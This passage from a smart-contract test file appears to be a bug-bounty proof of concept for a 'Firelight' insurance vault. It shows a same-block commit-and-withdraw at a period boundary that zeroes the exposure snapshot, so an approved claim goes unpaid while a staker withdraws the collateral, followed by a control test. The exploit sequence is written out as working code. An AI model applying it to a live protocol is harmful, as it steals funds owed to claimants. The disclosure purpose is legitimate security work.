    console.log('=== SETUP (mainnet-scale amounts, fXRP) ===')
    console.log('staker vault deposit (A) :', fmt6(DEPOSIT))
    console.log('funded first-loss buffer :', fmt6(FLB_BALANCE))
    console.log('cover sold for period    :', ethers.formatUnits(COVER, 18))

    // The attacker is an ordinary permissionless staker: assert it holds none of the
    // roles the exploit path might otherwise be dismissed as relying on.
    await assertUnprivileged(ctx, ctx.staker.address)

    console.log('=== EXPLOIT ===')
    // @pre: allocator will commit cover against totalAssetsAt(S) = A.
    // Step 1: commit at boundary S, then withdraw the full A in the SAME block.
    const { boundary, commitReceipt, withdrawReceipt, exposureBefore } =
      await commitAtBoundary(ctx, 0n)
    // @post: withdraw() wrote a checkpoint at key S with value A - x = 0, so the
    //        inclusive lookup totalAssetsAt(S) now returns 0; the withdrawal itself
    //        is parked in the still-slashable withdrawAssets[P+1] bucket.

    const capturePeriod = await ctx.vault.currentPeriod()
    const withdrawalPeriod = capturePeriod + 1n
    const exposureAfter = await ctx.vault.totalAssetsAt(boundary)

    console.log('commit tx index          :', commitReceipt.index.toString())
    console.log('withdraw tx index        :', withdrawReceipt.index.toString())
    console.log('totalAssetsAt(S) before  :', fmt6(exposureBefore), '(observed pre-block read)')
    console.log('totalAssetsAt(S) after   :', fmt6(exposureAfter), '<-- snapshot mutated to A - x')

    expect(exposureBefore).to.equal(DEPOSIT) // observed A before the block
    expect(exposureAfter).to.equal(0n) // lookup now returns A - x = 0
    expect(await ctx.vault.withdrawAssets(withdrawalPeriod)).to.equal(DEPOSIT)
    expect(await ctx.vault.pendingWithdrawAssets()).to.equal(DEPOSIT)

    // Step 2: settle the committed cover, capture a valid incident, approve it.
    const payout = await settleAndApproveIncident(ctx, boundary)

    console.log('=== RESULT ===')
    console.log('incident assessment loss :', ethers.formatUnits(payout.totalAssessmentLoss, 18))
    console.log('first-loss buffer paid   :', fmt6(payout.firstLossPaid))
    console.log('vault leg requested      :', fmt6(payout.requested))
    console.log('vault leg PAID           :', fmt6(payout.paid), '<-- should equal the vault leg')
    console.log('claim underpayment       :', fmt6(payout.requested - payout.paid))

    // The incident closes even though the vault leg paid nothing.
    expect(BigInt(payout.captureTimestamp)).to.be.greaterThan(boundary)
    expect(payout.firstLossPaid).to.equal(FLB_BALANCE)
    expect(payout.totalAssessmentLoss).to.equal(COVER)
    expect(payout.requested).to.equal(DEPOSIT) // vault leg = A (full-loss request)
    expect(payout.paid).to.equal(0n) // vault leg short-paid by the full A
    expect(payout.vaultReceiverDelta).to.equal(0n)
    expect(payout.flbReceiverDelta).to.equal(FLB_BALANCE)
    expect(await ctx.vault.pendingWithdrawAssets()).to.equal(DEPOSIT)

    // Step 3: two periods later, the staker claims the collateral that should have
    // funded the claim.
    await advancePastPayoutWindow(ctx.vault)
    const stakerBefore = await ctx.asset.balanceOf(ctx.staker.address)
    await ctx.vault.connect(ctx.staker).claimWithdraw(withdrawalPeriod)
    const claimed = (await ctx.asset.balanceOf(ctx.staker.address)) - stakerBefore

    console.log('staker claimed at P+2    :', fmt6(claimed), '<-- collateral that should have paid the claim')

    // QUANTIFIED IMPACT: a valid, approved claim is short-paid by the entire vault
    // leg (A of the A + FLB assessed loss), and the unprivileged staker walks away
    // with exactly that A. This maps to the program's Critical protocol-insolvency
    // class: Firelight cannot honor an approved obligation that was within its
    // contemporaneously committed capacity. The period-start value is an exposure
    // cap, not a segregated reserve. Funds are traced from the vault's own assets via
    // balance deltas, not from setBalance/deal.
    expect(claimed).to.equal(DEPOSIT)
    expect(payout.requested - payout.paid).to.equal(DEPOSIT)
  })

  it('control: the same withdrawal one block later (S+1) is fully slashed and pays the claim in full', async function () {
    const ctx = await loadFixture(deployFullStack)
    const { boundary, commitReceipt, withdrawReceipt } = await commitAtBoundary(ctx, 1n)

    // The only difference from the exploit is the withdrawal timestamp: the commit is
    // at exactly S, the withdrawal at exactly S+1 (in a later block).
    const commitBlock = await ethers.provider.getBlock(commitReceipt.blockNumber)
    const withdrawBlock = await ethers.provider.getBlock(withdrawReceipt.blockNumber)
    expect(BigInt(commitBlock.timestamp)).to.equal(boundary)
    expect(BigInt(withdrawBlock.timestamp)).to.equal(boundary + 1n)

    const capturePeriod = await ctx.vault.currentPeriod()
    const withdrawalPeriod = capturePeriod + 1n
    const exposure = await ctx.vault.totalAssetsAt(boundary)

    console.log('=== CONTROL (withdraw at S+1) ===')
    console.log('totalAssetsAt(S)         :', fmt6(exposure), '<-- unchanged')

    // A withdrawal one second past the boundary writes at key S+1, so totalAssetsAt(S)
    // still returns the full A.
    expect(exposure).to.equal(DEPOSIT)

    const payout = await settleAndApproveIncident(ctx, boundary)

    console.log('vault leg PAID           :', fmt6(payout.paid), '<-- full vault leg, no leak')

    expect(BigInt(payout.captureTimestamp)).to.be.greaterThan(boundary)
    expect(payout.firstLossPaid).to.equal(FLB_BALANCE)
    expect(payout.totalAssessmentLoss).to.equal(COVER)
    expect(payout.requested).to.equal(DEPOSIT)
    expect(payout.paid).to.equal(DEPOSIT) // vault leg pays in full
    expect(payout.vaultReceiverDelta).to.equal(DEPOSIT)
    expect(payout.flbReceiverDelta).to.equal(FLB_BALANCE)
    expect(await ctx.vault.pendingWithdrawAssets()).to.equal(0n)

    // The withdrawal was consumed by the payout; nothing survives to be claimed.
    await advancePastPayoutWindow(ctx.vault)
    await expect(
      ctx.vault.connect(ctx.staker).claimWithdraw(withdrawalPeriod),
    ).to.be.revertedWithCustomError(ctx.vault, 'NoWithdrawalAmount')
  })
})
```
